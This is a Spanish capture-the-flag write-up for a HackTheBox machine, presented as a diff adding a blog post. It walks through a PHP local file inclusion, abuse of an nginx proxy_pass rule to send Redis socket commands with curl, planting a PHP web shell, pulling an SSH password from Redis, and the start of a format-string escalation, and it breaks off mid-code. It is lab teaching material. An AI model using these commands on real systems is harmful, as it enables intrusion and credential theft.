@@ -1,0 +1,454 @@
+I"��<p>Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE</p>
+
+<p>Para la flag de user nos volveremos a conectar por el socket a redis, para filtrar la contraseña de SSH, y para la escalada explotaremos una vulnerabilidad format string en python</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn --open -p- 10.10.11.213
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+</code></pre></div></div>
+
+<p>Ese puerto 3000 se ve curioso, asi que escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -p22,80,3000 10.10.11.213 
+</code></pre></div></div>
+
+<p>Vean como en el escaneo nos dice que el puerto 3000 nos redirecciona hacia <code class="language-plaintext highlighter-rouge">microblog.htb:3000/</code></p>
+
+<p><img src="/assets/img/htb-format/1.png" alt="" /></p>
+
+<p>Asi que lo agregamos al etc/hosts</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     microblog.htb" | tee -a /etc/hosts</code></p>
+
+<p>Y si accedemos por el puerto 80 nos redirecciona a <code class="language-plaintext highlighter-rouge">app.microblog.htb</code>, asi que tambien lo agregamos al etc/hosts</p>
+
+<p><img src="/assets/img/htb-format/2.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     app.microblog.htb" | tee -a /etc/hosts</code></p>
+
+<p>(les puedo decir que no hace falta hacer fuzzing de directorios y tampoco enumerar subdominios).</p>
+
+<p>Ahora visitaremos la pagina web por el puerto 80, y al mostrar su codigo fuente vemos una URL que nos lleva a otro recurso</p>
+
+<p><img src="/assets/img/htb-format/3.png" alt="" /></p>
+
+<p>Al entrar, vemos que corresponde a Gitea, y tambien tenemos el repositorio del proyecto</p>
+
+<p><img src="/assets/img/htb-format/4.png" alt="" /></p>
+
+<p>Al ver un poco el codigo fuente, vemos que nos podemos registrar y nos mandara a la ruta <code class="language-plaintext highlighter-rouge">/dashboard</code>, antes que nada, observa este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+    <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">strval</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /register?message=User already exists&amp;status=fail"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /dashboard?message=Registration successful!&amp;status=success"</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Primero que nada crear una instancia de la clase <code class="language-plaintext highlighter-rouge">Redis()</code> llamada <code class="language-plaintext highlighter-rouge">redis</code>, y establece una conexion usando el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>, y en caso de que el usuario se haya registrado, se redireccionara a <code class="language-plaintext highlighter-rouge">/dashboard</code> con un mensaje de que se registro correctamente, como se puede ver:</p>
+
+<p><img src="/assets/img/htb-format/5.png" alt="" /></p>
+
+<p>Una vez en el dashboard, nos dejara crear un nuevo blog, que por la estructura, seria un subdominio de <code class="language-plaintext highlighter-rouge">microblog.htb</code> (tambien hay que agregarlo el /etc/hosts)</p>
+
+<p><img src="/assets/img/htb-format/6.png" alt="" /></p>
+
+<p>Tambien podemos ver que podemos editar nuestro blog, donde recibe dos datos, un header (h1) y un texto, en este punto interceptare la peticion con burp.</p>
+
+<p><img src="/assets/img/htb-format/7.png" alt="" /></p>
+
+<p>Vemos como nuestros datos se pasan por una peticion por POST, si volvemos a ver el codigo fuente, encontraremos las funciones que agregan el texto en ambos parametros</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
+    <span class="nv">$txt_nl</span> <span class="o">=</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">]);</span>
+    <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-text</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$txt_nl</span><span class="si">}</span><span class="s2">&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
+    <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Section added!&amp;status=success"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Primero vemos que cambia de directorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$txt_nl = nl2br($_POST['txt']);</code> convierte el valor recibido por el parametro <code class="language-plaintext highlighter-rouge">txt</code> al formato <code class="language-plaintext highlighter-rouge">nl2br</code>, despues con <code class="language-plaintext highlighter-rouge">$post_file = fopen("{$_POST['id']}", "w");</code> se abre el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> en modo escritura con el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y aca vemos lo mas interesante, con <code class="language-plaintext highlighter-rouge">fwrite($post_file, $html);</code>, escribe como contenido HTML del archivo que se abrio anteriormente, es decir, lo que se reciba por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y despues, con <code class="language-plaintext highlighter-rouge">order_file = fopen("order.txt", "a");</code> y <code class="language-plaintext highlighter-rouge">fwrite($order_file, $_POST['id'] . "\n");</code>, esta abriendo el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> y esta escribiendo el contenido de lo que se recibio por el parametro id de la peticion. (saber esto es importante)</p>
+
+<p>La conclusion a la que llegue, es que el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> es el que contiene, o lleva el orden de las secciones que se van agregando cuando se edita un blog, las cuales posteriormente seran escritas como contenido HTML, de hecho, cuando ingresamos los datos en los campos para editar el blog, nos dice que se agrego una nueva secccion</p>
+
+<p><img src="/assets/img/htb-format/8.png" alt="" /></p>
+
+<p>En este punto decidi ver cuando y donde se hace el llamado a <code class="language-plaintext highlighter-rouge">order.txt</code> dentro del proyecto, en caso de que hayas descargado el proyecto y abierto en VScode, usa el atajo <code class="language-plaintext highlighter-rouge">Ctrl + shift + f</code> para buscar, y el primer resultado que me salio fue este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">fetchPage</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/content"</span><span class="p">);</span>
+    <span class="nv">$order</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="no">FILE_IGNORE_NEW_LINES</span><span class="p">);</span>
+    <span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
+        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Primero con <code class="language-plaintext highlighter-rouge">chdir(getcwd() . "/content");</code> cambia de dircectorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$order = file("order.txt", FILE_IGNORE_NEW_LINES);</code> esta leyendo el contenido de <code class="language-plaintext highlighter-rouge">order.txt</code> donde se usa <code class="language-plaintext highlighter-rouge">FILE_IGNORE_NEW_LINES</code> para decirle que omita una nueva linea al final de cada elemento del array, esto para que cada elemento de <code class="language-plaintext highlighter-rouge">order.txt</code> contenga una nueva linea dentro del array (seguramente te sacaste de onda por que dije array, y no se esta declarando ningun array, pero es por que asi funciona la funcion <a href="https://www.phptutorial.net/php-tutorial/php-file/">file</a>, ya que lee un archivo completo en un array), despues todo este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
+        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Usa un foreach para recorrer cada elemento dentro del array que se guardo en <code class="language-plaintext highlighter-rouge">order</code>, y hace varias cosas:</p>
+
+<ul>
+  <li>Se guarda el valor de <code class="language-plaintext highlighter-rouge">$html_content</code> en <code class="language-plaintext highlighter-rouge">$temp</code></li>
+  <li>A <code class="language-plaintext highlighter-rouge">$html_content</code> se le asigna el valor de <code class="language-plaintext highlighter-rouge">$temp</code> y demas se le concatena cada linea del array usando <code class="language-plaintext highlighter-rouge">$line</code>, donde en cada linea se creara un elemento HTML(div), despues con <code class="language-plaintext highlighter-rouge">file_get_contents()</code> obtiene el contenido del archivo (order.txt) que corresponde a <code class="language-plaintext highlighter-rouge">$line</code>, y por ultimo con <code class="language-plaintext highlighter-rouge">return $html_content</code> devuelve todo el HTML</li>
+</ul>
+
+<h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h3>
+
+<p>El LFI se encuentra en la funcion <code class="language-plaintext highlighter-rouge">fetchPage()</code> cuando se usa <code class="language-plaintext highlighter-rouge">file_get_contents()</code>, ya que como mencione obtiene el contenido basandose en el archivo <code class="language-plaintext highlighter-rouge">order.txt</code>, y que es lo que pasa, nosotros podemos controlar lo que se ingresa en <code class="language-plaintext highlighter-rouge">order.txt</code> por que como explique antes, el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> tiene el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code> cuando editamos el blog cuando creamos una nueva seccion, asi que una vez sabiendo que el parametro ID es vulnerable a LFI, vamos a probar con <code class="language-plaintext highlighter-rouge">../../../etc/passwd</code>, y si, defitivamente es vulnerable a LFI</p>
+
+<p><img src="/assets/img/htb-format/9.png" alt="" /></p>
+
+<p>Eso no es todo, si pasan Wappalyzer por la web, se daran cuenta que usa un servidor nginx, con un reverse proxy igual en nginx, asi que podemos usar el LFI para leer los archivos de configuracion del proxy, que en nginx se encuentran en <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> y nos arroja algo como esto:</p>
+
+<h3 id="reverse-proxy-misconfigurations">Reverse proxy misconfigurations</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server { 
+	listen 80; 
+	listen [::]:80; 
+	root /var/www/microblog/app; 
+	index index.html index.htm index-nginx-debian.html; 
+	server_name microblog.htb; 
+	location / { 
+		return 404; 
+	} 
+	location = /static/css/health/ { 
+		resolver 127.0.0.1; 
+		proxy_pass http://css.microbucket.htb/health.txt; 
+	} 
+	location = /static/js/health/ { 
+		resolver 127.0.0.1; 
+		proxy_pass http://js.microbucket.htb/health.txt; 
+	} 
+	location ~ /static/(.*)/(.*) { 
+		resolver 127.0.0.1; 
+		proxy_pass http://$1.microbucket.htb/$2; 
+	}
+}
+</code></pre></div></div>
+
+<p>Observa esta parte:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	location ~ /static/(.*)/(.*) { 
+		resolver 127.0.0.1; 
+		proxy_pass http://$1.microbucket.htb/$2; 
+	}
+</code></pre></div></div>
+
+<p>La expresion <code class="language-plaintext highlighter-rouge">/static/(.*)/(.*)</code> es usanda para hacer referencia a dos textos en una URL, donde cada <code class="language-plaintext highlighter-rouge">(.*)</code> corresponde a uno de los dos textos y se usa <code class="language-plaintext highlighter-rouge">$1</code> y <code class="language-plaintext highlighter-rouge">$2</code> para representarlos , por ejemplo, cuando se acceda a <code class="language-plaintext highlighter-rouge">/static/directorio/nose.php</code> la parte de <code class="language-plaintext highlighter-rouge">/directorio</code> estara asociada a <code class="language-plaintext highlighter-rouge">$1</code> y la parte de <code class="language-plaintext highlighter-rouge">nose.php</code> estaria asociada a <code class="language-plaintext highlighter-rouge">$2</code>, y es una implementacion incorrecta en la directiva <code class="language-plaintext highlighter-rouge">proxy_pass</code> asi que nosotros podemos aprovecharnos de esa directiva para acceder a un acrhivo, pero… ¿A cual?</p>
+
+<p>Si volvemos a revisar el codigo fuente, podemos ver una funcion que verifica si una cuenta de usuario en “Pro”</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">isPro</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+        <span class="nv">$pro</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="s2">"pro"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$pro</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="s2">"false"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Con:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Esta conectandose a Redis para establecer una conexion a travez del archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>.</p>
+
+<p>Despues basicamente si el usuario tiene la propiedad “pro” establecida como “true”, retorna “true”, y si no, se retornará la cadena “false”, y como tenemos un implementacion incorrecta en el proxy, entonces podemos interactuar con el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code> para modificar los valores de la propiedad “pro”, par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:</p>
+
+<p><code class="language-plaintext highlighter-rouge">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:carta%20pro%20true%20a/b"</code></p>
+
+<p>Y nos debe de regresar algo como esto:</p>
+
+<p><img src="/assets/img/htb-format/10_000.png" alt="" /></p>
+
+<p>Y ya somos pro</p>
+
+<p><img src="/assets/img/htb-format/11.png" alt="" /></p>
+
+<p>Y observa como ahora ya nos deja subir imagenes</p>
+
+<h2 id="lfi-to-rce">LFI to RCE</h2>
+
+<p>Si volvemos a revisar el codigo fuente para subir una imagen, vemos que si intentamos subir un php no va a funcionar por que se esta filtrando</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nf">isPro</span><span class="p">()</span> <span class="o">===</span> <span class="s2">"false"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">print_r</span><span class="p">(</span><span class="s2">"Pro subscription required to upload images"</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Pro subscription required&amp;status=fail"</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bulletproof\Image</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setLocation</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../uploads"</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setSize</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">3000000</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setMime</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'png'</span><span class="p">));</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nv">$image</span><span class="p">[</span><span class="s2">"image"</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$upload</span> <span class="o">=</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">upload</span><span class="p">();</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$upload_path</span> <span class="o">=</span> <span class="s2">"/uploads/"</span> <span class="mf">.</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="nf">getName</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">".png"</span><span class="p">;</span>
+            <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-image</span><span class="se">\"</span><span class="s2">&gt;&lt;img src = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$upload_path</span><span class="si">}</span><span class="se">\"</span><span class="s2"> /&gt;&lt;/div&gt;"</span><span class="p">;</span>
+            <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
+            <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
+            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
+            <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
+            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image uploaded successfully&amp;status=success"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image upload failed&amp;status=fail"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Sin embargo como sabemos que tenemos un LFI en el parametro ID el cual escribe en order.txt, podriamos generar un archivo php el cual se guardara en la ruta <code class="language-plaintext highlighter-rouge">$image-&gt;setLocation(getcwd() . "/../uploads");</code> ya que el codigo anterior cambia de directorio para guardar ahi las imagenes, para generar el archivo en el parametro id debemos de poner <code class="language-plaintext highlighter-rouge">/var/www/microblog/&lt;tu_blog&gt;/uploads/shell.php</code> y en el parametro txt iria el comando que debemos de ejecutar, de esta manera</p>
+
+<p><img src="/assets/img/htb-format/12.png" alt="" /></p>
+
+<p>Asi que ahora al acceder al recurso: <code class="language-plaintext highlighter-rouge">http://&lt;tu_blog&gt;.microblog.htb/uploads/shell.php</code> podemos ver que el comando se ejecuto correctamente</p>
+
+<p><img src="/assets/img/htb-format/13.png" alt="" /></p>
+
+<p>Asi que solo quedar ejecutarnos una reverse shell y ya</p>
+
+<p><img src="/assets/img/htb-format/14.png" alt="" /></p>
+
+<h2 id="flag-de-user">Flag de user</h2>
+
+<p>Si usamos pspy para buscar procesos intersantes, podemos ver que existe uno que se llama <code class="language-plaintext highlighter-rouge">/usr/bin/redis-server</code>, como es un archivo de redis, podemos usar redis-cli -s para conectarnos y mandar comandos al servidor de redis, sin embargo, el ejecutarlo no sale nada aun que este esperando un comando:</p>
+
+<p><img src="/assets/img/htb-format/15.png" alt="" /></p>
+
+<p>Asi que podemos usar: <code class="language-plaintext highlighter-rouge">echo "info" | redis-cli -s /var/run/redis/redis.sock</code> para mostrar informacion del servidor, vemos como tiene establecido un <code class="language-plaintext highlighter-rouge">keyspace</code></p>
+
+<p><img src="/assets/img/htb-format/16.png" alt="" /></p>
+
+<p>Ahora podemos hacer uso de <code class="language-plaintext highlighter-rouge">echo "keys *" | redis-cli -s /var/run/redis/redis.sock</code> para devolver todas las claves almacenadas en la base de datos de Redis, y observa como tenemos una del usuario cooper:</p>
+
+<p><img src="/assets/img/htb-format/17.png" alt="" /></p>
+
+<p>Ahora usaremos <code class="language-plaintext highlighter-rouge">echo "type cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para devolver el tipo de valor que tiene la clave <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, para no poner otra imagen, es un hash, asi que usamos <code class="language-plaintext highlighter-rouge">echo "hgetall cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para que nos devuelva todos los valores asociados al hash de <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, y ahora ya obtuvimos la contraseña de cooper:</p>
+
+<p><img src="/assets/img/htb-format/18.png" alt="" /></p>
+
+<p>Ahora nos conectamos por ssh</p>
+
+<p><strong>usr:</strong> cooper</p>
+
+<p><strong>pass:</strong> zooperdoopercooper</p>
+
+<h2 id="escalada">Escalada</h2>
+
+<p>Si ingresamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver que podemos ejecutar como root sin contraseña, tenemos un archivo</p>
+
+<p><img src="/assets/img/htb-format/19.png" alt="" /></p>
+
+<p>Al hacerle un cat, tenemos un archivo de python</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">base64</span>
